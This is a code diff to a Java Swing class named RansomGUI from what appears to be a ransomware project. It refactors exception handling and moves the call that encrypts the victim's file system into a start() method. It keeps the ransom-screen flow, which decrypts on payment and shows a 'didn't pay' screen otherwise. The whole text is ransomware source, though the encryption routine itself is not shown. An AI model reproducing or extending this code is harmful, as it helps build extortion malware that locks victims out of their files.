@@ -10,7 +10,7 @@ import javax.swing.JLabel;
 import javax.swing.JPanel;
 
 import Agent.Attack.AttackVector;
-import Agent.exceptions.CryptoException;
+import Agent.exceptions.AttackVectorException;
 
 public class RansomGUI extends JFrame implements ActionListener {
 
@@ -20,7 +20,7 @@ public class RansomGUI extends JFrame implements ActionListener {
 	private AttackVector ransomProcess;
 	private static final long serialVersionUID = -486811144121647925L;
 
-	public RansomGUI() throws CryptoException {
+	public RansomGUI() {
 		label = new JLabel();
 		panel = new JPanel();
 		panel.setVisible(true);
@@ -28,11 +28,15 @@ public class RansomGUI extends JFrame implements ActionListener {
 		this.add(panel);
 		this.setVisible(true);
 
-		encryptionScreen();
+	}
+
+	public void start() throws AttackVectorException {
+
 		try {
 			ransomProcess.encryptFileSystem();
-		} catch (CryptoException e) {
-			throw new CryptoException("failed encrypting file system", e.getCause());
+			encryptionScreen();
+		} catch (AttackVectorException e) {
+			throw new AttackVectorException("encryption failed", e.getCause());
 		}
 	}
 
@@ -111,7 +115,7 @@ public class RansomGUI extends JFrame implements ActionListener {
 			ransomProcess.decryptFileSystem();
 			decryptionScreen();
 
-		} catch (CryptoException e) {
+		} catch (AttackVectorException e) {
 			didntPaidScreen();
 		}
 
